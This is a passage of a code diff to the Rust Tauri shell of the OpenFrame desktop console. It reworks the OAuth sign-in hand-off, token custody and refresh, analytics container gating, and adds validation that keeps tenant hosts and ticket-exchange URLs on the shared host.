@@ -1,4 +1,5 @@
 mod autostart;
+mod download_link;
 mod installer;
 // The background notification actions and the REST calls behind them exist on
 // both desktop platforms; Linux has no notification backend at all, so neither
@@ -38,7 +39,7 @@ use tauri::{
     AppHandle, Emitter, Manager, State, WebviewUrl, WebviewWindow, WebviewWindowBuilder,
     WindowEvent,
 };
-use tokens::NativeAuthTokens;
+use tokens::{NativeAuthTokens, PageTokens};
 
 /// App background applied to every window so no white frame shows before the
 /// page paints (matches the dark OpenFrame UI).
@@ -67,7 +68,7 @@ use tauri::ActivationPolicy;
 
 pub(crate) const MAIN_LABEL: &str = "main";
 
-/// The one URI scheme this app claims with the OS. Two hosts ride on it, and the
+/// The one URI scheme this app claims with the OS. Three hosts ride on it, and the
 /// host is what tells them apart:
 ///
 /// - `openframe-console://auth?devTicket=…` — the OAuth callback. The login runs
@@ -76,19 +77,24 @@ pub(crate) const MAIN_LABEL: &str = "main";
 ///   back by the OS.
 /// - `openframe-console://notify?payload=…` — what a Windows toast activates
 ///   (`notifications::CLICK_URI_PREFIX`).
+/// - `openframe-console://download?id=…` - the download page's "Open the app"
+///   link, carrying the id the installer was downloaded with (`download_link`).
 ///
 /// Registered on macOS by `Info.plist` (`CFBundleURLTypes`) and on Windows by
-/// [`register_url_scheme`] (HKCU) — one scheme, one registration, both uses.
+/// [`register_url_scheme`] (HKCU): one scheme, one registration, every use.
 ///
-/// It is also the value pushed to the frontend as
-/// `NEXT_PUBLIC_MOBILE_APP_SCHEME` (see [`env_init_script`]), which is what makes
-/// it build `<scheme>://auth` as the gateway `redirectTo`. Those two uses must
-/// stay the same string: the frontend names the callback, the OS delivers it.
+/// The frontend's sign-in hand-off page (`/auth/desktop-return/`) launches
+/// `<scheme>://auth?…` with the login's outcome, naming the scheme as
+/// `DESKTOP_APP_SCHEME` (`apps/web/src/lib/desktop-auth-return.ts`). Those two
+/// must stay the same string — the page names the callback, the OS delivers it —
+/// and a web test reads this constant to hold them together.
 ///
 /// The SaaS gateway only honours a redirect that appears verbatim in
-/// `openframe.gateway.redirect.allowed-uris`, so that exact URI has to be in
-/// that list or the callback is rewritten to the tenant root and the browser
-/// keeps the ticket. The OSS gateway honours any requested redirect.
+/// `openframe.gateway.redirect.allowed-uris`, so the hand-off page's exact URL
+/// has to be in that list or the redirect is rewritten to the tenant root and the
+/// browser keeps the ticket. `<scheme>://auth` stays listed for installed builds
+/// whose bundled frontend still redirects straight to it. The OSS gateway
+/// honours any requested redirect.
 pub(crate) const URI_SCHEME: &str = "openframe-console";
 
 /// Host that marks a URL on [`URI_SCHEME`] as the OAuth callback.
@@ -101,11 +107,31 @@ const AUTH_CALLBACK_HOST: &str = "auth";
 /// user walked away from.
 const LOGIN_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(300);
 
+// What a parked `native_auth_start` rejects with when it ends without an
+// outcome. The frontend matches these by value (`MOBILE_AUTH_ERROR` and
+// `DESKTOP_LOGIN_ERROR` in apps/web), and a web test reads them here.
+
+/// The user's cancel, or a newer start replacing this one: the code the
+/// frontend keeps quiet.
+const USER_CANCELED_ERROR: &str = "USER_CANCELED";
+/// No callback within [`LOGIN_TIMEOUT`].
+const LOGIN_TIMEOUT_ERROR: &str = "LOGIN_TIMEOUT";
+/// A callback that carried no outcome.
+#[cfg(any(target_os = "macos", target_os = "windows"))]
+const LOGIN_INCOMPLETE_ERROR: &str = "LOGIN_INCOMPLETE";
+
 /// Baked-in shared auth host, set at compile time
 /// (`OPENFRAME_SHARED_HOST_URL=https://… cargo build`). Overridable per install
 /// by `shared_host` in config.json, which is how a dev build points at a stage
 /// gateway without a rebuild.
 const DEFAULT_SHARED_HOST: Option<&str> = option_env!("OPENFRAME_SHARED_HOST_URL");
+
+/// GTM container, set at compile time like the shared host. GTM is what loads
+/// PostHog (the web app bundles no SDK), so a build without it sends no analytics.
+/// It is the web app's container, so a tag added there runs here too: the CSP keeps
+/// its remote scripts out, but an inline tag can call this shell's commands.
+/// [`gtm_container`] decides whether an install gets it.
+const GTM_CONTAINER_ID: Option<&str> = option_env!("OPENFRAME_GTM_CONTAINER_ID");
 
 static WINDOW_COUNTER: AtomicUsize = AtomicUsize::new(0);
 
@@ -384,6 +410,25 @@ pub(crate) fn tenant_host(cfg: &AppConfig) -> Option<String> {
         .map(str::to_string)
 }
 
+/// The GTM container this install may load: none unless it is on the shared host
+/// the binary was built for. One release serves every environment, and an install
+/// reaches stage or QA through `shared_host` in config.json, so the build cannot tell
+/// them apart and their test traffic would land in production analytics.
+fn gtm_container<'a>(
+    shared_host: Option<&str>,
+    built_for: Option<&str>,
+    container: Option<&'a str>,
+) -> &'a str {
+    let origin = |host: Option<&str>| {
+        host.and_then(|host| url::Url::parse(host).ok())
+            .map(|url| url.origin())
+    };
+    match (origin(shared_host), origin(built_for), container) {
+        (Some(host), Some(built_for), Some(container)) if host == built_for => container,
+        _ => "",
+    }
+}
+
 /// RFC 3986 unreserved set. Anything the shell interpolates into a URL — an id
 /// into a path, a bearer into a query — is escaped against this, so a value can
 /// never smuggle in a path or a parameter of its own.
@@ -462,9 +507,30 @@ pub(crate) fn on_read_only_mount(_path: &std::path::Path) -> bool {
     false
 }
 
-/// Accept "acme.openframe.ai", "https://acme.openframe.ai", or "…/" and
-/// normalize to a scheme-qualified origin with no trailing slash.
-fn normalize_host(input: &str) -> Result<String, String> {
+/// The same two names as `withLocalMode` in apps/web and the loopback sources in `devCsp`.
+pub(crate) fn is_loopback_host(host: &str) -> bool {
+    matches!(host, "localhost" | "127.0.0.1")
+}
+
+/// The URL parser accepts far more in a host than a tenant's name holds (`'`, `;`, `$`,
+/// `(`, `{`), and the agent's install command is written from this one, so each label
+/// is held to what may sit unquoted on that command line.
+fn is_tenant_host_name(host: &str) -> bool {
+    host.split('.').all(installer::is_install_arg)
+}
+
+/// Accept "acme.openframe.ai", "https://acme.openframe.ai", or "…/" and return
+/// the origin, if it is a tenant of the shared host this app was built for.
+///
+/// Everything the shell does on the tenant goes to this origin: it dials NATS with
+/// the bearer on the URL, fetches the updater manifest from it, and downloads the
+/// agent it runs as root from it. The page supplies the value, so it has to name a
+/// host the backend could have issued. Tenants live on `<slug>.<zone>`, where the
+/// zone is the shared host itself (`openframe.tenancy.base-domain` and the
+/// gateway's `Host=*.` route are both `SHARED_HOST_URL`) less the `auth.` alias it
+/// is also served under. Plain http is for a gateway on the developer's own box,
+/// and only when the shared host is on it too.
+pub(crate) fn tenant_origin(input: &str, shared_host: Option<&str>) -> Result<String, String> {
     let trimmed = input.trim();
     if trimmed.is_empty() {
         return Err("Host is empty".into());
@@ -474,8 +540,56 @@ fn normalize_host(input: &str) -> Result<String, String> {
     } else {
         format!("https://{trimmed}")
     };
-    url::Url::parse(&with_scheme).map_err(|e| format!("Invalid URL: {e}"))?;
-    Ok(with_scheme.trim_end_matches('/').to_string())
+    let url = url::Url::parse(&with_scheme).map_err(|e| format!("Invalid URL: {e}"))?;
+    if !url.username().is_empty()
+        || url.password().is_some()
+        || url.path() != "/"
+        || url.query().is_some()
+        || url.fragment().is_some()
+    {
+        return Err("Tenant host must be a bare origin".into());
+    }
+    let shared = shared_host
+        .and_then(|shared| url::Url::parse(shared).ok())
+        .ok_or("No shared host to check the tenant host against")?;
+    let shared_name = shared.host_str().unwrap_or_default();
+    let host = url.host_str().unwrap_or_default();
+    if !is_loopback_host(shared_name) && !is_tenant_host_name(host) {
+        return Err(format!("Tenant host {host} is not a plain host name"));
+    }
+    let allowed = if is_loopback_host(shared_name) {
+        is_loopback_host(host)
+    } else {
+        let zone = shared_name.strip_prefix("auth.").unwrap_or(shared_name);
+        url.scheme() == "https"
+            && (host == zone
+                || host
+                    .strip_suffix(zone)
+                    .is_some_and(|sub| sub.ends_with('.')))
+    };
+    if !allowed {
+        return Err(format!("Tenant host {host} is not under {shared_name}"));
+    }
+    Ok(url.origin().ascii_serialization())
+}
+
+/// The ticket exchange is a GET the page asks the shell to make, outside CORS, and
+/// whatever `Access-Token`/`Refresh-Token` the answer carries become the session.
+/// So it goes to the one place tickets are redeemed: the shared host's
+/// `/oauth/dev-exchange`, which is the only URL `native-login.ts` ever builds here.
+fn exchange_ticket_url(url: &str, shared_host: Option<&str>) -> Result<url::Url, String> {
+    let parsed = url::Url::parse(url).map_err(|e| format!("Invalid exchange URL: {e}"))?;
+    let shared = shared_host
+        .and_then(|shared| url::Url::parse(shared).ok())
+        .ok_or("No shared host to exchange the ticket at")?;
+    if parsed.origin() != shared.origin()
+        || !parsed.username().is_empty()
+        || parsed.password().is_some()
+        || parsed.path() != "/oauth/dev-exchange"
+    {
+        return Err("Ticket exchange must go to the shared host".into());
+    }
+    Ok(parsed)
 }
 
 /// JS injected into every window that hosts the bundled frontend, before any
@@ -484,11 +598,9 @@ fn normalize_host(input: &str) -> Result<String, String> {
 ///     build omits `<PublicEnvScript />`). `NEXT_PUBLIC_TENANT_HOST_URL` is
 ///     deliberately absent so `runtimeEnv.tenantHostUrl()` falls through to the
 ///     host login learned (`getStoredTenantHost`), which is what lets one binary
-///     serve any tenant. `NEXT_PUBLIC_MOBILE_APP_SCHEME` is the override
-///     `runtimeEnv.appScheme()` reads for the OAuth callback: without it the
-///     frontend defaults to mobile's `com.openframe.app`, which this app does
-///     not claim with the OS — so the browser would hand the ticket to whatever
-///     did (or to nothing), and the login would hang until it timed out.
+///     serve any tenant. No scheme is injected: the frontend names this app's
+///     scheme itself (`DESKTOP_APP_SCHEME`, pinned to [`URI_SCHEME`] by a web
+///     test).
 /// (2) `window.__OPENFRAME_SHELL__.nativeAuth` — the login + token-custody
 ///     bridge, backed here by the native_auth_* Tauri commands. Load-bearing:
 ///     drop it and the frontend's `nativeAuthPlugin()` is null, which kills
@@ -504,11 +616,13 @@ fn normalize_host(input: &str) -> Result<String, String> {
 ///   openframe-mobile's NativeAuthPlugin — one frontend interface, two
 ///   implementations — but only the methods desktop actually implements.
 fn env_init_script(app: &AppHandle) -> String {
+    let shared = shared_host(&load_config(app));
     let env = serde_json::json!({
-        "NEXT_PUBLIC_SHARED_HOST_URL": shared_host(&load_config(app)).unwrap_or_default(),
+        "NEXT_PUBLIC_SHARED_HOST_URL": shared.as_deref().unwrap_or_default(),
         "NEXT_PUBLIC_APP_MODE": "saas-tenant",
         "NEXT_PUBLIC_ENABLE_DEV_TICKET_OBSERVER": "true",
-        "NEXT_PUBLIC_MOBILE_APP_SCHEME": URI_SCHEME,
+        "NEXT_PUBLIC_GTM_CONTAINER_ID":
+            gtm_container(shared.as_deref(), DEFAULT_SHARED_HOST, GTM_CONTAINER_ID),
     });
     format!(
         r#"window.__ENV = {env};
@@ -519,8 +633,16 @@ window.__OPENFRAME_SHELL__ = {{
         url: o.url, callbackScheme: o.callbackScheme
       }});
     }},
+    cancel: function () {{
+      return window.__TAURI_INTERNALS__.invoke('native_auth_cancel');
+    }},
     exchangeTicket: function (o) {{
       return window.__TAURI_INTERNALS__.invoke('native_auth_exchange_ticket', {{ url: o.url }});
+    }},
+    revokeSession: function (o) {{
+      return window.__TAURI_INTERNALS__.invoke('native_auth_revoke_session', {{
+        tenantId: (o && o.tenantId) || null
+      }});
     }},
     getTokens: function () {{
       return window.__TAURI_INTERNALS__.invoke('native_auth_get_tokens');
@@ -533,8 +655,10 @@ window.__OPENFRAME_SHELL__ = {{
     clearTokens: function () {{
       return window.__TAURI_INTERNALS__.invoke('native_auth_clear_tokens');
     }},
-    refreshTokens: function () {{
-      return window.__TAURI_INTERNALS__.invoke('native_auth_refresh_tokens');
+    refreshTokens: function (o) {{
+      return window.__TAURI_INTERNALS__.invoke('native_auth_refresh_tokens', {{
+        rejectedAccessToken: (o && o.rejectedAccessToken) || null
+      }});
     }},
     setTenantHost: function (o) {{
       return window.__TAURI_INTERNALS__.invoke('native_auth_set_tenant_host', {{ origin: o.origin }});
@@ -695,9 +819,22 @@ fn spawn_show_fallback(window: &WebviewWindow) {
     });
 }
 
+/// Schemes of the companion apps a page may hand a link to; the OS opens
+/// whichever app claims the scheme. Nothing else outside http(s) leaves the app.
+///
+/// - `openframe-chat` — Fae, the end-user chat the agent installs on the device.
+///   "Open Fae" in the Getting Started tour opens `openframe-chat://open`.
+const APP_LINK_SCHEMES: &[&str] = &["openframe-chat"];
+
+/// Whether a link is for one of the [`APP_LINK_SCHEMES`] apps.
+fn is_app_link(url: &url::Url) -> bool {
+    APP_LINK_SCHEMES.contains(&url.scheme())
+}
+
 /// Routes `window.open` / `target="_blank"` requests, which a webview otherwise drops:
 /// bundle pages open in a new in-app window, external http(s) links open in the
-/// system browser, other schemes are blocked.
+/// system browser, companion-app links ([`APP_LINK_SCHEMES`]) go to the OS, other
+/// schemes are blocked.
 ///
 /// "In-app" means the target origin matches a live window that already hosts
 /// bundle content (main/child) — i.e. the app origin Tauri serves the bundle
@@ -710,6 +847,12 @@ fn handle_new_window(
     url: url::Url,
     features: NewWindowFeatures,
 ) -> NewWindowResponse<tauri::Wry> {
+    if is_app_link(&url) {
+        if let Err(e) = open_external(url.as_str()) {
+            log::error!("failed to open app link {url}: {e}");
+        }
+        return NewWindowResponse::Deny;
+    }
     if !matches!(url.scheme(), "http" | "https" | "tauri") {
         log::warn!("blocked new window for scheme '{}': {url}", url.scheme());
         return NewWindowResponse::Deny;
@@ -875,8 +1018,9 @@ fn sign_out(app: &AppHandle) -> Result<(), String> {
 
 // ---------------------------------------------------------------------------
 // NativeAuth bridge — backs window.__OPENFRAME_SHELL__.nativeAuth (see
-// env_init_script). Default browser -> openframe-console://auth?devTicket=
-// capture -> native token exchange -> local token store. Mirrors
+// env_init_script). Default browser -> gateway -> the frontend's hand-off page
+// (/auth/desktop-return/) -> openframe-console://auth?<outcome> capture ->
+// native token exchange -> local token store. Mirrors
 // openframe-mobile's NativeAuthPlugin.swift, with the browser in place of
 // mobile's ASWebAuthenticationSession.
 // ---------------------------------------------------------------------------
@@ -895,8 +1039,26 @@ struct AuthState {
     /// ours can ride on it (the same gap that leaves the flow without CSRF
     /// protection — see docs/auth-and-notifications.md). So a first browser tab
     /// finished after the user has already started a second attempt resolves
-    /// that second attempt, with a ticket old enough that the exchange fails.
+    /// that second attempt with its own result. Since Cancel lets a retry start
+    /// within the first ticket's lifetime, that ticket can still be good: the app
+    /// then signs in to whichever account the first tab finished with.
     pending_login: Mutex<Option<tokio::sync::oneshot::Sender<Result<String, String>>>>,
+    /// The tokens of a ticket exchange the page has not stored yet. The page gets
+    /// the access half and decides whether to keep the session (`completeTicketFlow`
+    /// resolves the tenant first and may give up); the refresh half waits here for
+    /// `native_auth_set_tokens` to name that access token.
+    exchanged: Mutex<Option<NativeAuthTokens>>,
+}
+
+impl AuthState {
+    /// The refresh token waiting for this access token, once.
+    fn claim_exchanged_refresh(&self, access_token: Option<&str>) -> Option<String> {
+        let mut exchanged = notifications::lock(&self.exchanged);
+        if access_token.is_none() || exchanged.as_ref()?.access_token.as_deref() != access_token {
+            return None;
+        }
+        exchanged.take()?.refresh_token
+    }
 }
 
 #[derive(Serialize)]
@@ -905,9 +1067,18 @@ struct NativeAuthStartResult {
     callback_url: String,
 }
 
+/// What a login can end with, each read by the frontend's `completeTicketFlow`:
+/// a ticket for the session, a ticket for an identity that still needs an
+/// account (the app finishes the signup on its own screen), or an outcome code
+/// instead of either: one the app words itself (`MOBILE_AUTH_ERROR` in
+/// apps/web), or an auth-server reference.
 #[cfg(any(target_os = "macos", target_os = "windows", test))]
-fn url_carries_ticket(url: &url::Url) -> bool {
-    url.query_pairs().any(|(k, _)| k == "devTicket")
+const CALLBACK_OUTCOME_PARAMS: [&str; 3] = ["devTicket", "signupTicket", "error"];
+
+#[cfg(any(target_os = "macos", target_os = "windows", test))]
+fn url_carries_outcome(url: &url::Url) -> bool {
+    url.query_pairs()
+        .any(|(k, _)| CALLBACK_OUTCOME_PARAMS.contains(&k.as_ref()))
 }
 
 /// Whether a URL the OS handed us is the OAuth callback — our scheme, our
@@ -937,10 +1108,11 @@ fn is_auth_callback(url: &url::Url) -> bool {
 /// a sign-in nobody in this process asked for, which is the property this
 /// nonce-less callback is least able to justify.
 ///
-/// A callback **without** a ticket fails the login rather than being ignored:
-/// the gateway appends one to every `authMobile` callback, so its absence means
-/// the flow never reached the BFF callback, and waiting out the full timeout
-/// would tell the user nothing.
+/// A callback **without** an outcome fails the login rather than being ignored:
+/// the gateway puts one on every `authMobile` callback, so its absence means the
+/// flow never reached the BFF callback. The web hand-off page sends exactly that
+/// bare callback when the gateway landed it with nothing, so waiting out the full
+/// timeout would tell the user nothing.
 #[cfg(any(target_os = "macos", target_os = "windows"))]
 fn handle_scheme_url(app: &AppHandle, url: &str) -> bool {
     let Ok(parsed) = url::Url::parse(url) else {
@@ -949,10 +1121,10 @@ fn handle_scheme_url(app: &AppHandle, url: &str) -> bool {
     if !is_auth_callback(&parsed) {
         return false;
     }
-    let result = if url_carries_ticket(&parsed) {
+    let result = if url_carries_outcome(&parsed) {
         Ok(url.to_string())
     } else {
-        Err("callback carried no ticket".into())
+        Err(LOGIN_INCOMPLETE_ERROR.into())
     };
     finish_login(app, result)
 }
@@ -968,14 +1140,14 @@ fn finish_login(app: &AppHandle, result: Result<String, String>) -> bool {
         return false;
     };
     match &result {
-        // Scheme and host only — the devTicket rides in the query string.
+        // Scheme and host only — the ticket rides in the query string.
         Ok(callback) => log::info!(
-            "[auth] devTicket callback captured (from: {})",
+            "[auth] login callback captured (from: {})",
             url::Url::parse(callback)
                 .map(|u| format!("{}://{}", u.scheme(), u.host_str().unwrap_or_default()))
                 .unwrap_or_else(|_| "<unparsed>".into())
         ),
-        Err(e) => log::info!("[auth] login ended without a ticket: {e}"),
+        Err(e) => log::info!("[auth] login ended without an outcome: {e}"),
     }
     // A send that fails means the waiter gave up between the take above and here
     // — say so rather than let the capture line stand as the last word.
@@ -987,7 +1159,8 @@ fn finish_login(app: &AppHandle, result: Result<String, String>) -> bool {
 }
 
 /// NativeAuth.start: run the gateway BFF OAuth flow in the user's **default
-/// browser** and resolve with the callback URL carrying `?devTicket=`.
+/// browser** and resolve with the callback URL carrying its outcome
+/// (`?devTicket=`, `?signupTicket=` or `?error=`).
 ///
 /// The browser is the point. A login window of our own is a fresh cookie jar, so
 /// an identity provider the user is already signed into on this machine cannot
@@ -996,19 +1169,20 @@ fn finish_login(app: &AppHandle, result: Result<String, String>) -> bool {
 /// with `disallowed_useragent`.
 ///
 /// The price is that nothing about the flow is observable from here any more —
-/// no navigation callbacks, no window to close. The ticket comes back only if
-/// the gateway redirects to [`URI_SCHEME`] and the OS hands us that URL
-/// ([`handle_scheme_url`]), which is why `callback_scheme` is checked against
-/// what we actually registered instead of being taken on faith. The shell hands
-/// the frontend this very value as `NEXT_PUBLIC_MOBILE_APP_SCHEME`, so any
-/// mismatch is a misconfiguration, and against a gateway that allow-lists the
-/// redirect by exact string equality it ends in the timeout below — better to
-/// fail immediately, naming the env var, than to hang for five minutes.
+/// no navigation callbacks, no window to close. The gateway redirects to the
+/// frontend's hand-off page on the shared host (`/auth/desktop-return/`), which
+/// shows the outcome in the tab and launches [`URI_SCHEME`] with it; the result
+/// comes back only when the OS hands us that URL ([`handle_scheme_url`]). That
+/// is why `callback_scheme` is checked against what we actually registered
+/// instead of being taken on faith: the frontend names it as
+/// `DESKTOP_APP_SCHEME`, which a web test pins to this constant, so a mismatch
+/// would otherwise end in the timeout below — better to fail immediately than to
+/// hang for five minutes.
 ///
 /// The old "accept ANY url carrying a ticket" fallback is gone with the window.
 /// A gateway that rewrites the redirect to the tenant root now leaves the ticket
 /// in the browser where this process cannot reach it, so on the SaaS side this
-/// flow *requires* the callback in `openframe.gateway.redirect.allowed-uris`.
+/// flow *requires* the hand-off page in `openframe.gateway.redirect.allowed-uris`.
 #[tauri::command]
 async fn native_auth_start(
     state: State<'_, AuthState>,
@@ -1028,7 +1202,7 @@ async fn native_auth_start(
     if scheme != URI_SCHEME {
         log::error!(
             "[auth] frontend asked to complete on {scheme}://, which this app does not claim \
-             — check NEXT_PUBLIC_MOBILE_APP_SCHEME"
+             — check DESKTOP_APP_SCHEME in apps/web/src/lib/desktop-auth-return.ts"
         );
         return Err(match callback_scheme {
             Some(_) => format!("Login callback scheme {scheme} is not the registered {URI_SCHEME}"),
@@ -1042,7 +1216,7 @@ async fn native_auth_start(
 
     let (tx, rx) = tokio::sync::oneshot::channel();
     if let Some(stale) = notifications::lock(&state.pending_login).replace(tx) {
-        let _ = stale.send(Err("USER_CANCELED".into()));
+        let _ = stale.send(Err(USER_CANCELED_ERROR.into()));
     }
 
     // `spawn`, so nothing here waits on the browser, and no shell, so the URL's
@@ -1056,29 +1230,58 @@ async fn native_auth_start(
         Ok(Ok(result)) => result.map(|callback_url| NativeAuthStartResult { callback_url }),
         // Sender dropped without sending. A replacement sends USER_CANCELED
         // rather than dropping, so in practice this is process teardown.
-        Ok(Err(_)) => Err("USER_CANCELED".into()),
+        Ok(Err(_)) => Err(USER_CANCELED_ERROR.into()),
         Err(_) => {
             log::warn!(
                 "[auth] no callback on {URI_SCHEME}://{AUTH_CALLBACK_HOST} within {}s — the \
-                 browser flow never came back (is the callback in the gateway's \
+                 browser flow never came back (is the hand-off page \
+                 https://<shared host>/auth/desktop-return/# in the gateway's \
                  redirect.allowed-uris?)",
                 LOGIN_TIMEOUT.as_secs()
             );
-            Err("LOGIN_TIMEOUT".into())
+            Err(LOGIN_TIMEOUT_ERROR.into())
         }
     }
 }
 
-/// NativeAuth.exchangeTicket: native (CORS-free) GET; the tokens ride on the
-/// Access-Token / Refresh-Token response headers, which a cross-origin webview
-/// fetch could not read.
+/// End the parked login as the user's own cancel, reporting whether one was
+/// waiting. `USER_CANCELED` is the code the frontend keeps quiet.
+fn cancel_pending_login(state: &AuthState) -> bool {
+    match notifications::lock(&state.pending_login).take() {
+        Some(tx) => tx.send(Err(USER_CANCELED_ERROR.into())).is_ok(),
+        None => false,
+    }
+}
+
+/// NativeAuth.cancel: the app's Cancel while the browser sign-in is open. The
+/// browser tab is ours to abandon but not to close, so this is the only end
+/// besides the timeout that the user can choose. Nothing waiting is not an
+/// error: the browser may have finished in the same instant. It is reported,
+/// though, so the app does not confirm a cancel that the callback beat.
 #[tauri::command]
-async fn native_auth_exchange_ticket(url: String) -> Result<NativeAuthTokens, String> {
+fn native_auth_cancel(state: State<'_, AuthState>) -> bool {
+    let canceled = cancel_pending_login(&state);
+    if canceled {
+        log::info!("[auth] login canceled from the app");
+    }
+    canceled
+}
+
+/// NativeAuth.exchangeTicket: native (CORS-free) GET, so the tokens on the
+/// Access-Token / Refresh-Token response headers land in the shell and not the
+/// page. The refresh token stops here (see [`AuthState::exchanged`] and
+/// [`PageTokens`]).
+#[tauri::command]
+async fn native_auth_exchange_ticket(
+    app: AppHandle,
+    state: State<'_, AuthState>,
+    url: String,
+) -> Result<PageTokens, String> {
+    let url = exchange_ticket_url(&url, shared_host(&load_config(&app)).as_deref())
+        .inspect_err(|e| log::warn!("[auth] refused a ticket exchange: {e}"))?;
     // Log the origin only — the ticket rides in the query string.
-    let origin = url::Url::parse(&url)
-        .map(|u| u.origin().ascii_serialization())
-        .unwrap_or_else(|_| "<invalid url>".into());
-    let response = reqwest::get(&url)
+    let origin = url.origin().ascii_serialization();
+    let response = reqwest::get(url)
         .await
         .inspect_err(|e| log::warn!("[auth] ticket exchange at {origin} failed: {e}"))
         .map_err(|e| format!("Ticket exchange failed: {e}"))?;
@@ -1103,57 +1306,78 @@ async fn native_auth_exchange_ticket(url: String) -> Result<NativeAuthTokens, St
         tokens.access_token.is_some(),
         tokens.refresh_token.is_some()
     );
-    Ok(tokens)
+    let page = PageTokens::from(tokens.clone());
+    *notifications::lock(&state.exchanged) = Some(tokens);
+    Ok(page)
 }
 
 /// Fresh-on-read: refreshes first when the stored access token is missing or
 /// expiring, so the webview resumes instantly after long idle.
 #[tauri::command]
-async fn native_auth_get_tokens(app: AppHandle) -> Result<NativeAuthTokens, String> {
-    Ok(tokens::ensure_fresh(&app).await)
+async fn native_auth_get_tokens(app: AppHandle) -> Result<PageTokens, String> {
+    Ok(tokens::ensure_fresh(&app).await.into())
+}
+
+/// NativeAuth.revokeSession: the half of sign-out that needs the refresh token,
+/// which the webview no longer has. Reports whether the gateway answered, the
+/// contract of the webview's `logoutAsync`.
+#[tauri::command]
+async fn native_auth_revoke_session(app: AppHandle, tenant_id: Option<String>) -> bool {
+    tokens::revoke_session(&app, tenant_id).await
 }
 
 /// Shell-owned refresh, delegated to by the webview's token-refresh-manager on
 /// upstream 401s. Force-refreshes (exp can't predict revocation), dampened by
-/// the previous access token so parallel callers don't rotate twice.
+/// the access token the webview says the gateway refused.
 ///
-/// A transient failure resolves with the tokens we still hold rather than
-/// rejecting. The webview cannot act on the difference: it maps every refresh
-/// that doesn't yield an access token to `forceLogout`, which calls back into
-/// `native_auth_clear_tokens` and deletes a refresh token that is good for days
-/// — so a rejection here turns one failed request into a lost session. Resolving
-/// with the stored set makes the caller retry that request (and fail it, which
-/// is not terminal) while the shell keeps retrying the rotation on its own.
-/// Deciding a session is over stays where custody is: `tokens::refresh` clears
-/// the store itself and then resolves empty, which the webview does act on.
+/// `rejected_access_token` is that token, passed through the bridge by
+/// `env_init_script`; see [`tokens::damping_token`] for why it, and not the
+/// stored token, is what the refresh is dampened against.
+///
+/// A transient failure rejects, and the webview takes a rejection to mean
+/// "transient": `executeRefresh` maps it to the `transient` outcome, which every
+/// caller of `refreshTokens` (apiClient, auth-api-client, the Relay environment)
+/// answers by failing that one request and leaving the session alone, while
+/// `refreshAccessToken` callers read it as "do not retry". Only a resolve with
+/// no access token is `terminal` and reaches `forceLogout`, which calls back into
+/// `native_auth_clear_tokens` and deletes a refresh token that is good for days —
+/// so deciding a session is over stays where custody is: `tokens::refresh` clears
+/// the store itself and then resolves empty. The bundle is the one staged from this
+/// commit (`scripts/build-web.sh`) and an update replaces shell and bundle
+/// together, so no older bundle meets this behaviour. It used to resolve with the
+/// stored tokens instead, which the webview reads as `refreshed`: it retried with
+/// the same rejected bearer, got another 401, and rotated again.
 #[tauri::command]
-async fn native_auth_refresh_tokens(app: AppHandle) -> Result<NativeAuthTokens, String> {
+async fn native_auth_refresh_tokens(
+    app: AppHandle,
+    rejected_access_token: Option<String>,
+) -> Result<PageTokens, String> {
     log::info!("[tokens] webview requested a refresh (upstream 401)");
-    let prev_access = tokens::load_tokens(&app).access_token;
-    match tokens::refresh(&app, true, prev_access, "webview upstream 401").await {
-        Ok(tokens) => Ok(tokens),
-        Err(e) => {
-            let stored = tokens::load_tokens(&app);
-            if stored.access_token.is_some() && stored.refresh_token.is_some() {
-                log::warn!(
-                    "[tokens] delegated refresh failed transiently ({e}) — keeping the session"
-                );
-                return Ok(stored);
-            }
-            Err(e)
-        }
-    }
+    let prev_access = tokens::damping_token(
+        rejected_access_token,
+        tokens::load_tokens(&app).access_token,
+    );
+    tokens::refresh(&app, true, prev_access, "webview upstream 401")
+        .await
+        .map(PageTokens::from)
 }
 
 /// Merge semantics and the lock they need both live in `tokens::merge_and_save`:
 /// a write from the webview must not land on top of a rotation the shell
 /// completed in between.
+///
+/// A refresh token still arrives here from the sign-ins the page runs itself
+/// (`storeTokensFromHeaders`). After a ticket exchange the page only has the access
+/// token, and naming it is what commits the refresh token the shell held back.
 #[tauri::command]
 async fn native_auth_set_tokens(
     app: AppHandle,
+    state: State<'_, AuthState>,
     access_token: Option<String>,
     refresh_token: Option<String>,
 ) -> Result<(), String> {
+    let refresh_token =
+        refresh_token.or_else(|| state.claim_exchanged_refresh(access_token.as_deref()));
     log::info!(
         "[tokens] webview stored tokens (access: {}, refresh: {})",
         access_token.is_some(),
@@ -1172,6 +1396,7 @@ fn native_auth_clear_tokens(app: AppHandle) -> Result<(), String> {
     // webview (force-logout / sign-out) or the tray's Sign Out — the shell's
     // own refresh logs its 401-clear separately in tokens.rs.
     log::info!("[tokens] tokens cleared (webview logout or tray sign-out)");
+    *notifications::lock(&app.state::<AuthState>().exchanged) = None;
     // Every logout funnels through here, so this is the one place that reliably
     // tears down the signed-out user's notification subscription.
     notifications::end_session(&app);
@@ -1183,8 +1408,9 @@ fn native_auth_clear_tokens(app: AppHandle) -> Result<(), String> {
 /// gateway without depending on webview localStorage.
 #[tauri::command]
 fn native_auth_set_tenant_host(app: AppHandle, origin: String) -> Result<(), String> {
-    let normalized = normalize_host(&origin)?;
     let mut cfg = load_config(&app);
+    let normalized = tenant_origin(&origin, shared_host(&cfg).as_deref())
+        .inspect_err(|e| log::warn!("[auth] refused a tenant host: {e}"))?;
     if cfg.learned_host.as_deref() != Some(normalized.as_str()) {
         log::info!("learned tenant host: {normalized}");
         cfg.learned_host = Some(normalized);
@@ -1193,6 +1419,7 @@ fn native_auth_set_tenant_host(app: AppHandle, origin: String) -> Result<(), Str
         // native_auth_set_tokens — is where a tenant switch becomes visible.
         // The live connection belongs to the tenant being left.
         nats::reconnect(&app);
+        updater::spawn_tenant_check(app.clone());
     }
     Ok(())
 }
@@ -1212,7 +1439,7 @@ fn take_pending_notification_click(window: WebviewWindow) -> Option<serde_json::
 }
 
 /// Deliver a scheme URI carried in a process's arguments — how Windows delivers
-/// both an OAuth callback and a toast click, either as our own argv (cold start)
+/// an OAuth callback, a toast click and an "Open the app" link, either as our own argv (cold start)
 /// or forwarded by the single-instance plugin (warm). macOS delivers neither
 /// this way: URL activation there is an Apple Event, which reaches us as
 /// `RunEvent::Opened`.
@@ -1222,8 +1449,11 @@ fn take_pending_notification_click(window: WebviewWindow) -> Option<serde_json::
 /// which is why this reports whether it delivered anything.
 #[cfg(target_os = "windows")]
 fn handle_scheme_argv(app: &AppHandle, args: &[String]) -> bool {
-    args.iter()
